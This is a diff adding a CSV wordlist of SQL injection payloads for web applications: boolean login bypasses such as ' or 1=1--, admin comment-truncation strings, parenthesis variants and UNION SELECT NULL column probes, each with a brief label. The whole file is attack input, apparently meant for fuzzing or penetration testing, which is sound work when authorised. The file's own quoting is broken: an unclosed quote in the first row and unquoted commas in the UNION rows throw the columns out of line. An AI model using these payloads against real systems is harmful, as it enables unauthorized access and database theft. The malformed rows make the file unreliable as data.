@@ -1,0 +1,17 @@
+payload,notes
+"',Single quote
+1' OR '1'='1,Classic boolean bypass
+1' OR '1'='1' --,Comment style 1
+1' OR '1'='1' /*,Comment style 2
+admin'--,Admin comment
+admin' #,Admin hash
+admin'/*,Admin slash-star
+' or 1=1--,Simpler boolean bypass
+' or 1=1#,Simpler boolean bypass (hash)
+' or 1=1/*,Simpler boolean bypass (slash)
+') or '1'='1--,Parenthesis bypass 1
+') or ('1'='1--,Parenthesis bypass 2
+1' AND '1'='2,Boolean false
+' UNION SELECT NULL--,Union select (1 col)
+' UNION SELECT NULL,NULL--,Union select (2 cols)
+' UNION SELECT NULL,NULL,NULL--,Union select (3 cols)
